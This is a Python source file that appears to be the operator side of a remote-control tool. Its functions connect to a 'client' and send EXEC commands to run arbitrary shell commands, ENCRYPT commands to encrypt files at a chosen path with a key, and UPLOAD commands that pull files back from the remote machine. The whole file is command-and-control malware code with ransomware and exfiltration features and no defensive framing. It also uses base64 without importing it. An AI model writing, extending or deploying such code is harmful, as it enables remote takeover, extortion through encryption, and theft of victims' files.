import socket
import json

def connect_to_client(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    return s

def send_exec_command(s, command):
    msg = json.dumps({"action": "EXEC", "command": command})
    s.sendall(msg.encode())
    response = s.recv(4096)
    print(json.loads(response.decode())["output"])

def send_encrypt_command(s, path, key):
    msg = json.dumps({"action": "ENCRYPT", "path": path, "key": key})
    s.sendall(msg.encode())

def send_upload_command(s, filepath):
    msg = json.dumps({"action": "UPLOAD", "path": filepath})
    s.sendall(msg.encode())
    raw = s.recv(16384)
    resp = json.loads(raw.decode())
    filename = resp.get("filename")
    data = resp.get("data")
    with open(f"received_{filename}", "wb") as f:
        f.write(base64.b64decode(data))
    print(f"[+] Fichier {filename} reçu.")
